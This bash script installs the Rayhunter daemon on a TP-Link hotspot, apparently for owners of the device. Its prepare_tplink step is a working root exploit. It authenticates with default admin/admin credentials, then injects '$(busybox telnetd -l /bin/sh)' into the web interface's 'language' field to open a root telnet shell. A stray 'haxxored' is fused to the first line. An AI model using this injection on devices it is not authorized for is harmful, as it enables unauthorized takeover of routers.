haxxored#!/usr/bin/env bash
install() {
    if [[ -z "${ADB}" ]]; then
        echo "\$ADB not set, did you run this from install-linux.sh or install-mac.sh?"
        exit 1
    fi

    echo "make sure you have a vfat formatted sd card inserted!"

    prepare_tplink
    setup_rayhunter
    test_rayhunter
}

prepare_tplink() {

    echo start prepare_tplink

    echo run root exploit

    nonce=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -X POST  -d '{"module":"authenticator","action":0}' | jq -r .nonce)

    # use default credentials at first 
    md5=$(printf "%s:%s:%s" ${1-admin} ${2-admin} "$nonce" | md5sum | cut "-d " -f1)

    printf "Nonce: %s\nMD5: %s\n" "$nonce" "$md5"

    token=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -d '{"module":"authenticator","action":1,"digest":"'"$md5"'"}' | jq -r .token)

    printf "Token: %s\n" "$token"

    curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}' > /dev/null
    curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"en"}' > /dev/null

    echo Exploit done

    echo activate adb per telnet session
    expect <<EOF
spawn nc 192.168.0.1 23

expect "/ #"
send "usb_composition 902B n y y\r"

expect "/ #"
send "exit\r"

expect eof
EOF

    echo closed telnet session

    echo mount sd card

    _adb_shell mount /dev/mmcblk0p1 /mnt/card

    echo finished prepare_tplink

}

wait_for_atfwd_daemon() {
    until [ -n "$(_adb_shell 'pgrep atfwd_daemon')" ]
    do
        sleep 1
    done
}

wait_for_adb_shell() {
    until _adb_shell true 2> /dev/null
    do
        sleep 1
    done
}

_adb_push() {
    "$ADB" push "$(dirname "$0")/$1" "$2"
}

_adb_shell() {
    "$ADB" shell "$1"
}

setup_rayhunter() {
    _adb_shell "mkdir -p /data/rayhunter"
    _adb_push config.toml.example /data/rayhunter/config.toml
    _adb_push rayhunter-daemon /mnt/card/rayhunter-daemon
    _adb_push scripts/rayhunter_daemon /etc/init.d/rayhunter_daemon
    _adb_push scripts/misc-daemon /etc/init.d/misc-daemon

    _adb_shell "chmod 755 /etc/init.d/rayhunter_daemon"
    _adb_shell "chmod 755 /etc/init.d/misc-daemon"

    echo -n "waiting for reboot..."
    _adb_shell "shutdown -r -t 1 now"

    # first wait for shutdown (it can take ~10s)
    until ! _adb_shell true 2> /dev/null
    do
        sleep 1
    done

    # now wait for boot to finish
    wait_for_adb_shell

    echo " done!"
}

test_rayhunter() {
    URL="http://localhost:8080"
    "$ADB" forward tcp:8080 tcp:8080 > /dev/null
    echo -n "checking for rayhunter server..."

    SECONDS=0
    while (( SECONDS < 30 )); do
        if curl -L --fail-with-body "$URL" -o /dev/null -s; then
            echo "success!"
            echo "you can access rayhunter at $URL"
            return
        fi
        sleep 1
    done
    echo "timeout reached! failed to reach rayhunter url $URL, something went wrong :("
}
